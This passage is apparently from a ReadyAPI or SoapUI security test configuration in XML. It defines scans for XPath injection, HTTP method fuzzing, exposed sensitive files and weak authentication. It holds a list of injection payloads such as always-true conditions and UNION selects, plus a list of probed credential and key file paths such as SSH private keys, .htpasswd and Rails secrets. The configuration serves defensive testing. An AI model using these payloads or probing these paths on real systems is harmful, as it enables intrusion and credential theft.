xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:strategy>ONE_BY_ONE</con:strategy><con:delay>100</con:delay></con:executionStrategy></con:testStepSecurityScan><con:testStepSecurityScan type="XPathInjectionSecurityScan" name="XPath Injection" id="0e8ccd34-6d4d-4dbb-8d7e-f04876962909" applyForFailedStep="false" disabled="false" runOnlyOnce="true"><con:settings/><con:config xsi:type="con:XPathInjection" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:xpathList> or name(//users/LoginID[1]) = 'LoginID' or 'a'='b</con:xpathList><con:xpathList>' or '1'='1</con:xpathList><con:xpathList>1/0</con:xpathList><con:xpathList>'%20o/**/r%201/0%20--</con:xpathList><con:xpathList>' o/**/r 1/0 --</con:xpathList><con:xpathList>;</con:xpathList><con:xpathList>'%20and%201=2%20--</con:xpathList><con:xpathList>' and 1=2 --</con:xpathList><con:xpathList>test�%20UNION%20select%201,%20@@version,%201,%201;�</con:xpathList><con:xpathList>test� UNION select 1, @@version, 1, 1;�</con:xpathList></con:config><con:assertion type="Sensitive Information Exposure" id="a64f90eb-bbf2-4465-8264-8a3e3497a7f9" name="Sensitive Information Exposure"><con:configuration/></con:assertion><con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/><con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:parameters label="service-path" parameterName="service-path" xpath="" checked="true"/></con:checkedParameters><con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:strategy>ONE_BY_ONE</con:strategy><con:delay>100</con:delay></con:executionStrategy></con:testStepSecurityScan><con:testStepSecurityProScan type="HttpMethodFuzzingScan" name="HTTP Method Fuzzing" id="b53d0d3c-b6d8-4254-8d8e-6448632629b7" applyForFailedStep="false" disabled="false" runOnlyOnce="true"><con:settings/><con:config xsi:type="con:HttpMethodFuzzingScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:deselectedMethods/></con:config><con:assertion type="Sensitive Information Exposure" id="7c33df8f-7557-4ef3-9b99-752ed441a95d" name="Sensitive Information Exposure"><con:configuration/></con:assertion><con:assertion type="Valid HTTP Status Codes" id="4ea5c5e2-5cc3-4fec-a280-d0c760c7b479" name="Valid HTTP Status Codes"><con:settings><con:setting id="__LEVEL_">WARNING</con:setting></con:settings><con:configuration><codes>501,405,403</codes></con:configuration></con:assertion><con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/><con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/><con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:strategy>ONE_BY_ONE</con:strategy><con:delay>100</con:delay></con:executionStrategy></con:testStepSecurityProScan><con:testStepSecurityProScan type="SensitiveFileSecurityScan" name="Sensitive Files Exposure" id="f44c1a67-dc8d-4cc9-9a6a-945eda470995" applyForFailedStep="false" disabled="false" runOnlyOnce="true"><con:settings/><con:config xsi:type="con:SensitiveFileSecurityScan" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/known_hosts"/><con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/authorized_keys"/><con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_dsa"/><con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_dsa.bak"/><con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_dsa.old"/><con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_dsa~"/><con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_rsa"/><con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_rsa.bak"/><con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_rsa.old"/><con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_rsa~"/><con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htaccess"/><con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htaccess.bak"/><con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htaccess.old"/><con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/htaccess.txt"/><con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htaccess~"/><con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htpasswd"/><con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htpasswd.bak"/><con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htpasswd.old"/><con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htpasswd~"/><con:sensitiveFile description="Usually reside in a users home directory on a Linux/UNIX machine" fileName="/.bash_history"/><con:sensitiveFile description="Usually reside in a users home directory on a Linux/UNIX machine" fileName="/.bashrc"/><con:sensitiveFile description="Usually reside in a users home directory on a Linux/UNIX machine" fileName="/.history"/><con:sensitiveFile description="Usually reside in a users home directory on a Linux/UNIX machine" fileName="/.profile"/><con:sensitiveFile description="Usually reside in a users home directory on a Linux/UNIX machine" fileName="/.mysql_history"/><con:sensitiveFile description="Usually reside in a users home directory on a Linux/UNIX machine" fileName="/~root"/><con:sensitiveFile description="Contains info from SCM (git, svn...)" fileName="/.git/config"/><con:sensitiveFile description="Contains info from SCM (git, svn...)" fileName="/.git/HEAD"/><con:sensitiveFile description="Contains info from SCM (git, svn...)" fileName="/.git/index"/><con:sensitiveFile description="Contains info from SCM (git, svn...)" fileName="/.svn/entries"/><con:sensitiveFile description="Contains info from SCM (git, svn...)" fileName="/.svn/wc.db"/><con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/pccsmysqladm/incs/dbconnect.inc"/><con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/perl/"/><con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/phpBB/phpinfo.php"/><con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/weblogic"/><con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/wp-admin/wp-login.php"/><con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/wp-content/debug.log"/><con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/WEB-INF/web.xml"/><con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/iisadmin/"/><con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/iissamples/"/><con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/index.jsp"/><con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/index.php"/><con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/index.html.bak"/><con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/index.html.old"/><con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/index.html~"/><con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/manager"/><con:sensitiveFile description="May exist if Ruby on Rails is used on the server" fileName="/config/database.yml"/><con:sensitiveFile description="May exist if Ruby on Rails is used on the server" fileName="/config/initializers/secret_token.rb"/><con:sensitiveFile description="May exist if Ruby on Rails is used on the server" fileName="/db/seeds.rb"/><con:sensitiveFile description="May exist if Ruby on Rails is used on the server" fileName="/db/development.sqlite3"/></con:config><con:assertion type="Sensitive Files Exposure Assertion" id="ff149bc7-3d7d-4b3b-8f31-ce35ad5c2c55" name="Sensitive Files Exposure"/><con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/><con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/><con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:strategy>ONE_BY_ONE</con:strategy><con:delay>100</con:delay></con:executionStrategy></con:testStepSecurityProScan><con:testStepSecurityProScan type="WeakAuthenticationScan" name="Weak Authentication" id="6aba696a-5e64-4e94-8c0a-a9a258cad4f2" applyForFailedStep="false" disabled="false" runOnlyOnce="true"><con:settings/><con:config xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/><con:assertion type="WeakPassword" id="5884718f-a284-4cc4-8bb7-eb825a3c7448" name="Weak Password Detection"><con:configuration/></con:assertion><con:assertion type="BasicAuth" id="9e134128-ade6-44b4-b54c-89109c44a7a8" name="Basic Authentication Detection"/><con:testStep xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/><con:checkedParameters xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/><con:executionStrategy xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:strategy>ONE_BY_ONE</con:strategy><con:delay>100</con:delay></con:executionStrategy></con:testStepSecurityProScan></con:testStepSecurityTest><con:properties/><con:reportParameters/></con:securityTest><con:environmentSpec><con:entry environmentId="5eadaddc-50e1-41ae-911a-8a2f7c39ffe0"><con:authProfile>Inherit From Parent</con:authProfile></con:entry><con:entry environmentId="e2e9701f-ac19-4e25-a4a0-65eddefe8bd7"><con:authProfile>Inherit From Parent</con:authProfile></con:entry><con:entry environmentId="d0beedb0-1186-4d88-99b9-78d2322fa1f9"><con:authProfile>Inherit From Parent</con:authProfile></con:entry></con:environmentSpec></con:testCase>